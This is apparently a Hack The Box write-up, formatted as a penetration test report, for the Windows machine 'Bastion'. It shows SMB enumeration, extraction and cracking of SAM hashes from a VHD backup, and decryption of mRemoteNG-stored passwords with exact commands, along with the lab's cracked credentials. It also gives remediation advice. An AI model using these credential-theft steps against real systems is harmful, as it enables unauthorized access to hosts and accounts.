# Penetration Test Report — Bastion

![Difficulty](https://img.shields.io/badge/difficulty-Easy-green) ![OS](https://img.shields.io/badge/OS-Windows-blue) ![Focus](https://img.shields.io/badge/focus-VHD%20SAM%20extraction%20%2F%20mRemoteNG-red)

## Executive Summary

An authorized assessment of `target.htb` identified an anonymously accessible SMB `Backups` share containing a **VHD (Virtual Hard Disk) image**. The SAM and SYSTEM hives were extracted from the image and cracked offline, revealing the password of user `l4mpje` and yielding SSH access. The installed **mRemoteNG** connection manager stored the Administrator password using its known insecure encryption, which was decrypted — resulting in full host compromise.

## Findings Overview

| # | Finding | Severity |
|---|---|---|
| 1 | Anonymous SMB share exposing a full system backup (VHD) | Critical |
| 2 | Crackable local account hashes in extracted SAM/SYSTEM | High |
| 3 | mRemoteNG 1.76.11 insecure credential storage | High |

## Technical Walkthrough

### 1. Enumeration

```bash
ports=$(nmap -p- --min-rate=1000 -T4 target.htb | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV -T4 target.htb
smbclient -N -L //target.htb
smbclient -N //target.htb/Backups
```

A non-default `Backups` share was anonymously readable and contained a large **VHD file** — a full filesystem backup.

### 2. Extracting Credentials from the VHD

The VHD was browsed remotely from a Windows VM (7-Zip → *Open here*), and the credential hives were copied out:

```
Windows\System32\config\SAM
Windows\System32\config\SYSTEM
```

Hashes dumped and cracked offline:

```bash
samdump2 SYSTEM SAM
# l4mpje NT hash → cracked (HashKiller) → bureaulampje
```

### 3. Foothold

```bash
ssh l4mpje@target.htb   # password: bureaulampje
```

User flag on the Desktop.

### 4. Privilege Escalation — mRemoteNG

Installed programs included **mRemoteNG** (version 1.76.11 per `changelog.txt`) — a remote connection manager with publicly documented **insecure password storage** ([reference](http://hackersvanguard.com/mremoteng-insecure-password-storage/)). Its connection file was exfiltrated:

```bash
scp l4mpje@target.htb:\users\l4mpje\AppData\Roaming\mRemoteNG\confCons.xml confCons.xml
```

The file was imported into a local mRemoteNG install, and an External Tool was used to reveal stored passwords:

1. Tools → External Tools → New: `Filename: cmd`, `Arguments: /k echo "password %password%"`
2. Right-click the stored `DC` connection → run the external tool.

The Administrator password was echoed: `thXLHM96BeKL0ER2`.

```bash
ssh Administrator@target.htb
```

Administrator shell; root flag obtained.

## Remediation

- Restrict backup shares to dedicated backup accounts; never expose disk images anonymously.
- Treat any mounted/extractable backup as live credential material; encrypt backups at rest.
- Replace mRemoteNG or upgrade; store connection secrets in a proper vault; rotate any credentials ever stored in it.

## MITRE ATT&CK Mapping

| Tactic | Technique |
|---|---|
| Credential Access | T1003.002 — SAM (from backup image) |
| Credential Access | T1555 — Credentials from Password Stores (mRemoteNG) |
| Initial Access / Lateral | T1021.004 — SSH with recovered credentials |

---
*Assessment performed in an authorized lab environment (Hack The Box).*
